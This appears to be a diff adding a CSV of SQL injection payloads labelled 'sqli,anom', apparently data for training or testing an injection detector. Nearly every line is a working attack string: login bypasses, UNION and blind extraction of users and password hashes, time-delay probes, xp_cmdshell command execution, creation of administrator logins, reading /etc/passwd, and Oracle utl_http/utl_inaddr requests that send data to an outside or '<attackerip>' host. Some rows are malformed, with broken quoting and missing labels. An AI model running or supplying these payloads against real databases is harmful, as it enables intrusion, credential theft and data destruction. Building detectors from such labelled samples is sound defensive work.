+admin' or '1'='1,sqli,anom
+admin' or '1'='1'--,sqli,anom
+admin' or '1'='1'#,sqli,anom
+admin' or '1'='1'/*,sqli,anom
+admin'or 1=1 or ''=',sqli,anom
+admin' or 1=1,sqli,anom
+admin' or 1=1--,sqli,anom
+admin' or 1=1#,sqli,anom
+admin' or 1=1/*,sqli,anom
+admin') or ('1'='1,sqli,anom
+admin') or ('1'='1'--,sqli,anom
+admin') or ('1'='1'#,sqli,anom
+admin') or ('1'='1'/*,sqli,anom
+admin') or '1'='1,sqli,anom
+admin') or '1'='1'--,sqli,anom
+admin') or '1'='1'#,sqli,anom
+admin') or '1'='1'/*,sqli,anom
+"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",sqli,anom
+"admin"" --",sqli,anom
+"admin"" #",sqli,anom
+"admin""/*",sqli,anom
+"admin"" or ""1""=""1",sqli,anom
+"admin"" or ""1""=""1""--",sqli,anom
+"admin"" or ""1""=""1""#",sqli,anom
+"admin"" or ""1""=""1""/*",sqli,anom
+"admin""or 1=1 or """"=""",sqli,anom
+"admin"" or 1=1",sqli,anom
+"admin"" or 1=1--",sqli,anom
+"admin"" or 1=1#",sqli,anom
+"admin"" or 1=1/*",sqli,anom
+"admin"") or (""1""=""1",sqli,anom
+"admin"") or (""1""=""1""--",sqli,anom
+"admin"") or (""1""=""1""#",sqli,anom
+"admin"") or (""1""=""1""/*",sqli,anom
+"admin"") or ""1""=""1",sqli,anom
+"admin"") or ""1""=""1""--",sqli,anom
+"admin"") or ""1""=""1""#",sqli,anom
+"admin"") or ""1""=""1""/*",sqli,anom
+"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",sqli,anom
+"SELECT * FROM admin WHERE pass = '.md5($password,true).""'""",sqli,anom
+"admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",sqli,anom
+?id=1%09and%091=1%09--,sqli,anom
+?id=1%0Dand%0D1=1%0D--,sqli,anom
+?id=1%0Cand%0C1=1%0C--,sqli,anom
+?id=1%0Band%0B1=1%0B--,sqli,anom
+?id=1%0Aand%0A1=1%0A--,sqli,anom
+?id=1%A0and%A01=1%A0--,sqli,anom
+?id=1/*comment*/and/**/1=1/**/--,sqli,anom
+?id=(1)and(1)=(1)--,sqli,anom
+"LIMIT 0,1 ",sqli,anom
+"SUBSTR('SQL',1,1)",sqli,anom
+"SELECT 1,2,3,4",sqli,anom
+"?id=1 and substring(version(),1,1)like(5)",sqli,anom
+"?id=1 and substring(version(),1,1)not in(4,3)",sqli,anom
+"?id=1 and substring(version(),1,1)in(4,3)",sqli,anom
+"?id=1 and substring(version(),1,1) between 3 and 4",sqli,anom
+?id=1 AND 1=1,sqli,anom
+?id=1 AnD 1=1,sqli,anom
+?id=1 aNd 1=1,sqli,anom
+AND   -> &&,sqli,anom
+OR    -> ||,sqli,anom
+"=     -> LIKE,REGEXP, BETWEEN, not < and not >",sqli,anom
+> X   -> not between 0 and X,sqli,anom
+WHERE -> HAVING,sqli,anom
+select * from mysql.innodb_table_stats;,sqli,anom
+show tables in dvwa;,sqli,anom
+select @@innodb_version;,sqli,anom
+==,sqli,anom
+=,sqli,anom
+',sqli,anom
+' --,sqli,anom
+' #,sqli,anom
+' –,sqli,anom
+'--,sqli,anom
+'/*,sqli,anom
+'#,sqli,anom
+" --
+ #",sqli,anom
+"/*
+' and 1='1
+' and a='a
+ or 1=1
+ or true
+' or ''='
+ or """"=""",sqli,anom
+1?) and '1?='1–,sqli,anom
+"' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055",sqli,anom
+" AND 1=0 UNION ALL SELECT "", 81dc9bdb52d04dc20036dbd8313ed055",sqli,anom
+ and 1=1,sqli,anom
+ and 1=1–,sqli,anom
+' and 'one'='one,sqli,anom
+' and 'one'='one–,sqli,anom
+' group by password having 1=1--,sqli,anom
+' group by userid having 1=1--,sqli,anom
+' group by username having 1=1--,sqli,anom
+ like '%',sqli,anom
+ or 0=0 --,sqli,anom
+ or 0=0 #,sqli,anom
+ or 0=0 –,sqli,anom
+' or         0=0 #,sqli,anom
+' or 0=0 --,sqli,anom
+' or 0=0 #,sqli,anom
+' or 0=0 –,sqli,anom
+" or 0=0 --
+ or 0=0 #",sqli,anom
+" or 0=0 –
+%' or '0'='0
+ or 1=1
+ or 1=1--
+ or 1=1/*
+ or 1=1#
+ or 1=1–
+' or 1=1--
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'/*
+' or '1'='1'#
+' or '1?='1
+' or 1=1
+' or 1=1 --
+' or 1=1 –
+' or 1=1--
+' or 1=1;#
+' or 1=1/*
+' or 1=1#
+' or 1=1–
+') or '1'='1
+') or '1'='1--
+') or '1'='1'--
+') or '1'='1'/*
+') or '1'='1'#
+') or ('1'='1
+') or ('1'='1--
+') or ('1'='1'--
+') or ('1'='1'/*
+') or ('1'='1'#
+'or'1=1
+'or'1=1?
+ or ""1""=""1",sqli,anom
+" or 1""=""1""--",sqli,anom
+" or 1""=""1""/*",sqli,anom
+" or 1""=""1""#",sqli,anom
+" or 1=1
+ or 1=1 --",sqli,anom
+" or 1=1 –
+ or 1=1--",sqli,anom
+" or 1=1/*
+ or 1=1#",sqli,anom
+" or 1=1–
+) or ""1""=""1",sqli,anom
+") or 1""=""1""--",sqli,anom
+") or 1""=""1""/*",sqli,anom
+") or 1""=""1""#",sqli,anom
+") or (1""=""1",sqli,anom
+") or (1""=""1""--",sqli,anom
+") or (1""=""1""/*",sqli,anom
+") or (1""=""1""#",sqli,anom
+) or '1?='1–,sqli,anom
+) or ('1?='1–,sqli,anom
+' or 1=1 LIMIT 1;#,sqli,anom
+'or 1=1 or ''=',sqli,anom
+"or 1=1 or ""=",sqli,anom
+' or 'a'='a,sqli,anom
+' or a=a--,sqli,anom
+' or a=a–,sqli,anom
+') or ('a'='a,sqli,anom
+" or a""=""a",sqli,anom
+") or (a""=""a",sqli,anom
+"') or ('a'='a and hi"") or (""a""=""a",sqli,anom
+' or 'one'='one,sqli,anom
+' or 'one'='one–,sqli,anom
+' or uid like '%,sqli,anom
+' or uname like '%,sqli,anom
+' or userid like '%,sqli,anom
+' or user like '%,sqli,anom
+' or username like '%,sqli,anom
+' or 'x'='x,sqli,anom
+') or ('x'='x,sqli,anom
+" or x""=""x",sqli,anom
+' OR 'x'='x'#;,sqli,anom
+'=' 'or' and '=' 'or',sqli,anom
+"' UNION ALL SELECT 1, @@version;#",sqli,anom
+"' UNION ALL SELECT system_user(),user();#",sqli,anom
+"' UNION select table_schema,table_name FROM information_Schema.tables;#",sqli,anom
+"admin' and substring(password/text(),1,1)='7",sqli,anom
+"' and substring(password/text(),1,1)='7",sqli,anom
+' or 1=1 limit 1 -- -+,sqli,anom
+"'=""or'",sqli,anom
+waitfor delay '0:0:20' /* ,sqli,anom
+ waitfor delay '0:0:20' --,sqli,anom
+' waitfor delay '0:0:20' /* ,sqli,anom
+' waitfor delay '0:0:20' --,sqli,anom
+" waitfor delay '0:0:20' /* 
+ waitfor delay '0:0:20' --",sqli,anom
+) waitfor delay '0:0:20' /* ,sqli,anom
+) waitfor delay '0:0:20' --,sqli,anom
+)) waitfor delay '0:0:20' /* ,sqli,anom
+)) waitfor delay '0:0:20' --,sqli,anom
+))) waitfor delay '0:0:20' /* ,sqli,anom
+))) waitfor delay '0:0:20' --,sqli,anom
+)))) waitfor delay '0:0:20' /* ,sqli,anom
+)))) waitfor delay '0:0:20' --,sqli,anom
+))))) waitfor delay '0:0:20' --,sqli,anom
+)))))) waitfor delay '0:0:20' --,sqli,anom
+') waitfor delay '0:0:20' /* ,sqli,anom
+') waitfor delay '0:0:20' --,sqli,anom
+") waitfor delay '0:0:20' /* 
+) waitfor delay '0:0:20' --",sqli,anom
+')) waitfor delay '0:0:20' /* ,sqli,anom
+')) waitfor delay '0:0:20' --,sqli,anom
+")) waitfor delay '0:0:20' /* 
+)) waitfor delay '0:0:20' --",sqli,anom
+'))) waitfor delay '0:0:20' /* ,sqli,anom
+'))) waitfor delay '0:0:20' --,sqli,anom
+"))) waitfor delay '0:0:20' /* 
+))) waitfor delay '0:0:20' --",sqli,anom
+')))) waitfor delay '0:0:20' /* ,sqli,anom
+')))) waitfor delay '0:0:20' --,sqli,anom
+")))) waitfor delay '0:0:20' /* 
+)))) waitfor delay '0:0:20' --",sqli,anom
+'))))) waitfor delay '0:0:20' /* ,sqli,anom
+'))))) waitfor delay '0:0:20' --,sqli,anom
+"))))) waitfor delay '0:0:20' /* 
+))))) waitfor delay '0:0:20' --",sqli,anom
+')))))) waitfor delay '0:0:20' /* ,sqli,anom
+')))))) waitfor delay '0:0:20' --,sqli,anom
+")))))) waitfor delay '0:0:20' /* 
+)))))) waitfor delay '0:0:20' --",sqli,anom
+# you will need to customize/modify some of the vaules in the queries for best effect,sqli,anom
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--,sqli,anom
+'create user name identified by 'pass123' --,sqli,anom
+'create user name identified by pass123 temporary tablespace temp default tablespace users; ,sqli,anom
+' ; drop table temp --,sqli,anom
+"'exec sp_addlogin 'name' , 'password' --",sqli,anom
+"' exec sp_addsrvrolemember 'name' , 'sysadmin' --",sqli,anom
+"' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --",sqli,anom
+' grant connect to name; grant resource to name; --,sqli,anom
+"' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)",sqli,anom
+' or 1=1 --,sqli,anom
+' union (select @@version) --,sqli,anom
+"' union (select NULL, (select @@version)) --",sqli,anom
+"' union (select NULL, NULL, (select @@version)) --",sqli,anom
+"' union (select NULL, NULL, NULL,  (select @@version)) --",sqli,anom
+"' union (select NULL, NULL, NULL, NULL,  (select @@version)) --",sqli,anom
+"' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --",sqli,anom
+# ms-sqli info disclosure payload fuzzfile,sqli,anom
+# replace regex with your fuzzer for best results <attackerip> <sharename>,sqli,anom
+"# run wireshark or tcpdump, look for incoming smb or icmp packets from victim",sqli,anom
+# might need to terminate payloads with ;--,sqli,anom
+select @@version,sqli,anom
+select @@servernamee,sqli,anom
+select @@microsoftversione,sqli,anom
+select * from master..sysserverse,sqli,anom
+select * from sysusers,sqli,anom
+exec master..xp_cmdshell 'ipconfig+/all',sqli,anom
+exec master..xp_cmdshell 'net+view',sqli,anom
+exec master..xp_cmdshell 'net+users',sqli,anom
+exec master..xp_cmdshell 'ping+<attackerip>',sqli,anom
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat',sqli,anom
+"create table myfile (line varchar(8000))"" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'"" select * from myfile""--",sqli,anom
+1'1,sqli,anom
+1 exec sp_ (or exec xp_),sqli,anom
+1 and 1=1,sqli,anom
+1' and 1=(select count(*) from tablenames); --,sqli,anom
+1 or 1=1,sqli,anom
+1' or '1'='1,sqli,anom
+"and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+" and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+" and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+"' and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+"' and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+"' and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+" and 0=benchmark(3000000,MD5(1))%20/*
+ and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+" and 0=benchmark(3000000,MD5(1))%20%23
+) and 0=benchmark(3000000,MD5(1))%20/*
+) and 0=benchmark(3000000,MD5(1))%20--
+) and 0=benchmark(3000000,MD5(1))%20%23
+)) and 0=benchmark(3000000,MD5(1))%20/*
+)) and 0=benchmark(3000000,MD5(1))%20--
+)) and 0=benchmark(3000000,MD5(1))%20%23
+))) and 0=benchmark(3000000,MD5(1))%20/*
+))) and 0=benchmark(3000000,MD5(1))%20--
+))) and 0=benchmark(3000000,MD5(1))%20%23
+)))) and 0=benchmark(3000000,MD5(1))%20/*
+)))) and 0=benchmark(3000000,MD5(1))%20--
+)))) and 0=benchmark(3000000,MD5(1))%20%23
+') and 0=benchmark(3000000,MD5(1))%20/*
+') and 0=benchmark(3000000,MD5(1))%20--
+') and 0=benchmark(3000000,MD5(1))%20%23
+) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+") and 0=benchmark(3000000,MD5(1))%20--
+) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+"')) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+"')) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+"')) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+")) and 0=benchmark(3000000,MD5(1))%20/*
+)) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+")) and 0=benchmark(3000000,MD5(1))%20%23
+'))) and 0=benchmark(3000000,MD5(1))%20/*
+'))) and 0=benchmark(3000000,MD5(1))%20--
+'))) and 0=benchmark(3000000,MD5(1))%20%23
+))) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+"))) and 0=benchmark(3000000,MD5(1))%20--
+))) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+"')))) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
+"')))) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+"')))) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
+")))) and 0=benchmark(3000000,MD5(1))%20/*
+)))) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
+")))) and 0=benchmark(3000000,MD5(1))%20%23
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+’ or ‘1’=’1
+' or '1'='1
+'||utl_http.request('httP://192.168.1.1/')||'
+' || myappadmin.adduser('admin', 'newpass') || '
+' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i
+select version();	
+select current_database();
+select current_user;
+select session_user;
+select current_setting('log_connections');
+select current_setting('log_statement');
+select current_setting('port');
+select current_setting('password_encryption');
+select current_setting('krb_server_keyfile');
+select current_setting('virtual_host');
+select current_setting('port');
+select current_setting('config_file');
+select current_setting('hba_file');
+select current_setting('data_directory');
+select * from pg_shadow;
+select * from pg_group;
+create table myfile (input TEXT);
+copy myfile from '/etc/passwd'; 
+select * from myfile;copy myfile to /tmp/test;
+OR 1=1
+ OR 1=0
+ OR x=x
+ OR x=y
+ OR 1=1#
+ OR 1=0#
+ OR x=x#
+ OR x=y#
+ OR 1=1-- 
+ OR 1=0-- 
+ OR x=x-- 
+ OR x=y-- 
+ OR 3409=3409 AND ('pytW' LIKE 'pytW
+ OR 3409=3409 AND ('pytW' LIKE 'pytY
+ HAVING 1=1
+ HAVING 1=0
+ HAVING 1=1#
+ HAVING 1=0#
+ HAVING 1=1-- 
+ HAVING 1=0-- 
+ AND 1=1
+ AND 1=0
+ AND 1=1-- 
+ AND 1=0-- 
+ AND 1=1#
+ AND 1=0#
+ AND 1=1 AND '%'='
+ AND 1=0 AND '%'='
+ AND 1083=1083 AND (1427=1427
+ AND 7506=9091 AND (5913=5913
+ AND 1083=1083 AND ('1427=1427
+ AND 7506=9091 AND ('5913=5913
+ AND 7300=7300 AND 'pKlZ'='pKlZ
+ AND 7300=7300 AND 'pKlZ'='pKlY
+ AND 7300=7300 AND ('pKlZ'='pKlZ
+ AND 7300=7300 AND ('pKlZ'='pKlY
+ AS INJECTX WHERE 1=1 AND 1=1
+ AS INJECTX WHERE 1=1 AND 1=0
+ AS INJECTX WHERE 1=1 AND 1=1#
+ AS INJECTX WHERE 1=1 AND 1=0#
+ AS INJECTX WHERE 1=1 AND 1=1--
+ AS INJECTX WHERE 1=1 AND 1=0--
+ WHERE 1=1 AND 1=1
+ WHERE 1=1 AND 1=0
+ WHERE 1=1 AND 1=1#
+ WHERE 1=1 AND 1=0#
+ WHERE 1=1 AND 1=1--
+ WHERE 1=1 AND 1=0--
+ ORDER BY 1-- 
+ ORDER BY 2-- 
+ ORDER BY 3-- 
+ ORDER BY 4-- 
+ ORDER BY 5-- 
+ ORDER BY 6-- 
+ ORDER BY 7-- 
+ ORDER BY 8-- 
+ ORDER BY 9-- 
+ ORDER BY 10-- 
+ ORDER BY 11-- 
+ ORDER BY 12-- 
+ ORDER BY 13-- 
+ ORDER BY 14-- 
+ ORDER BY 15-- 
+ ORDER BY 16-- 
+ ORDER BY 17-- 
+ ORDER BY 18-- 
+ ORDER BY 19-- 
+ ORDER BY 20-- 
+ ORDER BY 21-- 
+ ORDER BY 22-- 
+ ORDER BY 23-- 
+ ORDER BY 24-- 
+ ORDER BY 25-- 
+ ORDER BY 26-- 
+ ORDER BY 27-- 
+ ORDER BY 28-- 
+ ORDER BY 29-- 
+ ORDER BY 30-- 
+ ORDER BY 31337-- 
+ ORDER BY 1# 
+ ORDER BY 2# 
+ ORDER BY 3# 
+ ORDER BY 4# 
+ ORDER BY 5# 
+ ORDER BY 6# 
+ ORDER BY 7# 
+ ORDER BY 8# 
+ ORDER BY 9# 
+ ORDER BY 10# 
+ ORDER BY 11# 
+ ORDER BY 12# 
+ ORDER BY 13# 
+ ORDER BY 14# 
+ ORDER BY 15# 
+ ORDER BY 16# 
+ ORDER BY 17# 
+ ORDER BY 18# 
+ ORDER BY 19# 
+ ORDER BY 20# 
+ ORDER BY 21# 
+ ORDER BY 22# 
+ ORDER BY 23# 
+ ORDER BY 24# 
+ ORDER BY 25# 
+ ORDER BY 26# 
+ ORDER BY 27# 
+ ORDER BY 28# 
+ ORDER BY 29# 
+ ORDER BY 30#
+ ORDER BY 31337#
+ ORDER BY 1 
+ ORDER BY 2 
+ ORDER BY 3 
+ ORDER BY 4 
+ ORDER BY 5 
+ ORDER BY 6 
+ ORDER BY 7 
+ ORDER BY 8 
+ ORDER BY 9 
+ ORDER BY 10 
+ ORDER BY 11 
+ ORDER BY 12 
+ ORDER BY 13 
+ ORDER BY 14 
+ ORDER BY 15 
+ ORDER BY 16 
+ ORDER BY 17 
+ ORDER BY 18 
+ ORDER BY 19 
+ ORDER BY 20 
+ ORDER BY 21 
+ ORDER BY 22 
+ ORDER BY 23 
+ ORDER BY 24 
+ ORDER BY 25 
+ ORDER BY 26 
+ ORDER BY 27 
+ ORDER BY 28 
+ ORDER BY 29 
+ ORDER BY 30 
+ ORDER BY 31337 
+ RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+ RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
+IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+%' AND 8310=8310 AND '%'='
+%' AND 8310=8311 AND '%'='
+ and (select substring(@@version,1,1))='X'
+ and (select substring(@@version,1,1))='M'
+ and (select substring(@@version,2,1))='i'
+ and (select substring(@@version,2,1))='y'
+ and (select substring(@@version,3,1))='c'
+ and (select substring(@@version,3,1))='S'
+ and (select substring(@@version,3,1))='X'
+ sleep(5)#
+1 or sleep(5)#
+ or sleep(5)#",sqli,anom
+' or sleep(5)#,sqli,anom
+ or sleep(5)=,sqli,anom
+' or sleep(5)=',sqli,anom
+1) or sleep(5)#,sqli,anom
+) or sleep(5)=,sqli,anom
+') or sleep(5)=',sqli,anom
+1)) or sleep(5)#,sqli,anom
+)) or sleep(5)=,sqli,anom
+')) or sleep(5)=',sqli,anom
+;waitfor delay '0:0:5'--,sqli,anom
+);waitfor delay '0:0:5'--,sqli,anom
+';waitfor delay '0:0:5'--,sqli,anom
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--",sqli,anom
